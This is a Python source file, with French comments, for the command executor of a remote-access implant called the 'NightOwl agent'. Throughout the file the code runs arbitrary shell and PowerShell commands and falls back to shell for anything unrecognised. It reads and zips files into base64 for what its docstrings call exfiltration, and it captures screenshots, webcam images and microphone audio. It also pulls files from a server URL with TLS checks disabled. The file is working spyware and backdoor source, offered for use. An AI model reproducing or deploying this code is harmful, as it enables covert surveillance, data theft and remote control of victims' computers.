#!/usr/bin/env python3
"""
Exécuteur de commandes pour l'agent NightOwl
"""

import asyncio
import logging
import subprocess
import shlex
import platform
import os
import base64
import io
import zipfile
from typing import Dict, Optional


class CommandExecutor:
    """Exécute les commandes système"""
    
    def __init__(self):
        self.logger = logging.getLogger("nightowl.agent.command_executor")
        # Add file handler for debugging
        fh = logging.FileHandler('agent_debug.log')
        fh.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        self.logger.setLevel(logging.DEBUG)
    
    async def execute(self, command: str, params: Dict = None) -> Dict:
        """Exécute une commande et retourne le résultat"""
        command = str(command).strip()
        
        # Nettoyer la commande des guillemets éventuels
        if (command.startswith("'") and command.endswith("'")) or (command.startswith('"') and command.endswith('"')):
            command = command[1:-1].strip()
        
        print(f"DEBUG: Executing command '{command}' (repr: {repr(command)})", flush=True)
        self.logger.info(f"EXECUTING COMMAND: '{command}' (Type: {type(command)}, Len: {len(command)})")
        try:
            if command == "shell":
                return await self.execute_shell_command(params)
            elif command == "powershell":
                return await self.execute_powershell(params)
            elif command == "whoami":
                return await self.execute_whoami()
            elif command == "pwd":
                return await self.execute_pwd()
            elif command == "ls":
                return await self.execute_ls(params)
            elif command == "ps":
                return await self.execute_ps()
            elif command == "ifconfig":
                return await self.execute_ifconfig()
            elif command == "download":
                return await self.execute_download(params)
            elif command == "zip":
                return await self.execute_zip(params)
            elif command == "screenshot":
                self.logger.info("MATCHED SCREENSHOT")
                return await self.execute_screenshot(params)
            elif command == "cam_snapshot":
                return await self.execute_cam_snapshot(params)
            elif command == "mic_record":
                return await self.execute_mic_record(params)
            elif command == "upload_file":
                return await self.execute_upload_file(params)
            elif command == "download_url":
                return await self.execute_download_url(params)
            else:
                self.logger.info(f"NO MATCH FOR '{command}', FALLBACK TO SHELL")
                # Fallback: exécution comme commande shell directe
                # Permet d'exécuter des commandes arbitraires non listées explicitement
                return await self.execute_shell_command({"command": command})
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_shell_command(self, params: Dict) -> Dict:
        """Exécute une commande shell"""
        if not params or 'command' not in params:
            return {
                "status": "error",
                "error": "Paramètre 'command' manquant",
                "timestamp": self._get_timestamp()
            }
        
        command = params['command']
        try:
            # Exécution de la commande
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            # Debug log
            self.logger.info(f"Shell command '{command}' finished. Stdout: {len(stdout)}b, Stderr: {len(stderr)}b")
            
            return {
                "status": "success",
                "command": command,
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_powershell(self, params: Dict) -> Dict:
        """Exécute une commande PowerShell"""
        if not params or 'command' not in params:
            return {
                "status": "error",
                "error": "Paramètre 'command' manquant",
                "timestamp": self._get_timestamp()
            }
        
        command = params['command']
        try:
            process = await asyncio.create_subprocess_shell(
                f"powershell -Command {shlex.quote(command)}",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            self.logger.info(f"LS finished. Stdout: {len(stdout)}b")
            
            return {
                "status": "success",
                "command": command,
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_whoami(self) -> Dict:
        """Exécute la commande whoami"""
        try:
            # Prefer using python standard library if possible for stability
            import getpass
            user = getpass.getuser()
            
            # Try to get domain/user via command for more detail
            process = await asyncio.create_subprocess_shell(
                "whoami",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            self.logger.info(f"Whoami finished. Stdout: {len(stdout)}b")
            
            output = stdout.decode('utf-8', errors='ignore').strip()
            if not output:
                output = user
                
            self.logger.info(f"Whoami finished: {output}")

            return {
                "status": "success",
                "command": "whoami",
                "exit_code": process.returncode,
                "stdout": output,
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_pwd(self) -> Dict:
        """Exécute la commande pwd (print working directory)"""
        try:
            cwd = os.getcwd()
            self.logger.info(f"PWD executed: {cwd}")
            
            return {
                "status": "success",
                "command": "pwd",
                "exit_code": 0,
                "stdout": cwd,
                "stderr": "",
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_ls(self, params: Dict) -> Dict:
        """Liste les fichiers d'un répertoire"""
        directory = params.get('directory', '.') if params else '.'
        try:
            process = await asyncio.create_subprocess_shell(
                f"dir {shlex.quote(directory)}" if platform.system() == "Windows" else f"ls -la {shlex.quote(directory)}",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            self.logger.info(f"LS finished. Stdout: {len(stdout)}b")
            
            return {
                "status": "success",
                "command": "ls",
                "directory": directory,
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_ps(self) -> Dict:
        """Liste les processus"""
        try:
            process = await asyncio.create_subprocess_shell(
                "tasklist" if platform.system() == "Windows" else "ps aux",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            return {
                "status": "success",
                "command": "ps",
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_ifconfig(self) -> Dict:
        """Affiche la configuration réseau"""
        try:
            cmd = "ipconfig" if platform.system() == "Windows" else "ifconfig"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            self.logger.info(f"Ifconfig ({cmd}) finished. Stdout: {len(stdout)}b")

            return {
                "status": "success",
                "command": "ifconfig",
                "exit_code": process.returncode,
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": self._get_timestamp()
            }
    
    async def execute_download(self, params: Dict) -> Dict:
        """Télécharge un fichier (exfiltration)"""
        if not params or 'path' not in params:
             return {"status": "error", "error": "Paramètre 'path' manquant", "timestamp": self._get_timestamp()}
        
        file_path = params['path']
        if not os.path.exists(file_path):
            return {"status": "error", "error": f"Fichier introuvable: {file_path}", "timestamp": self._get_timestamp()}
            
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
                encoded = base64.b64encode(content).decode('utf-8')
                
            return {
                "status": "success",
                "command": "download",
                "path": file_path,
                "size": len(content),
                "data": encoded, # Base64 encoded content
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {"status": "error", "error": str(e), "timestamp": self._get_timestamp()}

    async def execute_zip(self, params: Dict) -> Dict:
        """Compresse un dossier pour exfiltration"""
        if not params or 'path' not in params:
             return {"status": "error", "error": "Paramètre 'path' manquant", "timestamp": self._get_timestamp()}
             
        folder_path = params['path']
        if not os.path.exists(folder_path):
             return {"status": "error", "error": f"Chemin introuvable: {folder_path}", "timestamp": self._get_timestamp()}
             
        try:
            # Create zip in memory
            mem_zip = io.BytesIO()
            with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
                if os.path.isfile(folder_path):
                     zf.write(folder_path, os.path.basename(folder_path))
                else:
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            archive_name = os.path.relpath(file_path, os.path.dirname(folder_path))
                            zf.write(file_path, archive_name)
                            
            content = mem_zip.getvalue()
            encoded = base64.b64encode(content).decode('utf-8')
            
            return {
                "status": "success",
                "command": "zip",
                "origin_path": folder_path,
                "size": len(content),
                "data": encoded,
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {"status": "error", "error": str(e), "timestamp": self._get_timestamp()}

    def _get_timestamp(self) -> str:
        """Retourne un timestamp formaté"""
        from datetime import datetime, timezone
        return datetime.now(timezone.utc).isoformat()

    async def execute_screenshot(self, params: Dict) -> Dict:
        """Capture d'écran"""
        # 1. Try MSS (Most reliable, works with hardware acceleration/browsers)
        try:
            import mss
            import mss.tools
            
            with mss.mss() as sct:
                # Capture all monitors combined (monitor 0) or primary (monitor 1)
                # Using monitor 1 (primary) usually gives better results for single screenshot
                monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                sct_img = sct.grab(monitor)
                
                # Convert directly to PNG bytes
                png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                b64 = base64.b64encode(png_bytes).decode('utf-8')
                
                return {
                    "status": "success",
                    "b64": b64,
                    "format": "png",
                    "timestamp": self._get_timestamp(),
                    "method": "mss"
                }
        except ImportError:
            pass # MSS not installed
        except Exception as e:
            self.logger.error(f"MSS screenshot failed: {e}")

        # 2. Try PIL (Standard fallback)
        try:
            from PIL import ImageGrab
            
            # Capture
            screenshot = ImageGrab.grab()
            
            # Save to bytes
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            content = buffer.getvalue()
            b64 = base64.b64encode(content).decode('utf-8')
            
            return {
                "status": "success",
                "b64": b64,
                "format": "png",
                "timestamp": self._get_timestamp(),
                "method": "pil"
            }
        except ImportError:
            pass # PIL not installed
        except Exception as e:
            self.logger.error(f"PIL screenshot failed: {e}")

        # 3. Fallback to PowerShell (Native Windows)
        try:
            return await self.execute_powershell({
                "command": """
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $Width = $Screen.Width
                $Height = $Screen.Height
                $Left = $Screen.Left
                $Top = $Screen.Top
                $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
                $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
                $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
                $MemoryStream = New-Object System.IO.MemoryStream
                $Bitmap.Save($MemoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                $Bytes = $MemoryStream.ToArray()
                $Base64 = [Convert]::ToBase64String($Bytes)
                Write-Output $Base64
                """
            })
        except Exception as e:
            return {"status": "error", "error": f"All screenshot methods failed. Last error: {e}"}

    async def execute_cam_snapshot(self, params: Dict) -> Dict:
        """Capture webcam"""
        try:
            import cv2
            
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return {"status": "error", "error": "No camera found"}
                
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                return {"status": "error", "error": "Failed to capture frame"}
                
            # Encode as JPEG
            ret, buffer = cv2.imencode('.jpg', frame)
            if not ret:
                return {"status": "error", "error": "Failed to encode image"}
                
            b64 = base64.b64encode(buffer).decode('utf-8')
            
            return {
                "status": "success",
                "b64": b64,
                "format": "jpg",
                "timestamp": self._get_timestamp()
            }
        except ImportError:
             return {"status": "error", "error": "OpenCV (cv2) not installed"}
        except Exception as e:
            return {"status": "error", "error": f"Camera failed: {e}"}

    async def execute_mic_record(self, params: Dict) -> Dict:
        """Enregistrement microphone"""
        duration = int(params.get('duration', 5))
        try:
            import sounddevice as sd
            import soundfile as sf
            import numpy as np
            
            # Record
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
            sd.wait()
            
            # Save to memory buffer
            buffer = io.BytesIO()
            sf.write(buffer, recording, fs, format='WAV')
            buffer.seek(0)
            
            b64 = base64.b64encode(buffer.read()).decode('utf-8')
            
            return {
                "status": "success",
                "b64": b64,
                "format": "wav",
                "duration": duration,
                "timestamp": self._get_timestamp()
            }
        except ImportError:
             # Fallback logic could go here (e.g. PowerShell)
             return {"status": "error", "error": "Audio libraries not installed"}
        except Exception as e:
            return {"status": "error", "error": f"Mic recording failed: {e}"}

    async def execute_upload_file(self, params: Dict) -> Dict:
        """Upload file from Agent to Server (Exfiltration)"""
        # Alias for execute_download logic but with explicit naming
        return await self.execute_download(params)

    async def execute_download_url(self, params: Dict) -> Dict:
        """Download file from URL to Agent (Ingress)"""
        url = params.get('url')
        destination = params.get('destination')
        server_url = params.get('server_url')
        
        if not url or not destination:
             return {"status": "error", "error": "Missing url or destination"}
             
        # Handle relative URLs
        if url.startswith('/') and server_url:
            url = f"{server_url.rstrip('/')}{url}"
        
        try:
            # Use aiohttp for async download instead of blocking requests
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False) as response:
                    if response.status != 200:
                        return {"status": "error", "error": f"HTTP {response.status}"}
                    
                    content = await response.read()
                    
                    with open(destination, 'wb') as f:
                        f.write(content)
                
            return {
                "status": "success",
                "message": f"File downloaded to {destination}",
                "size": len(content),
                "timestamp": self._get_timestamp()
            }
        except Exception as e:
            return {"status": "error", "error": f"Download failed: {e}"}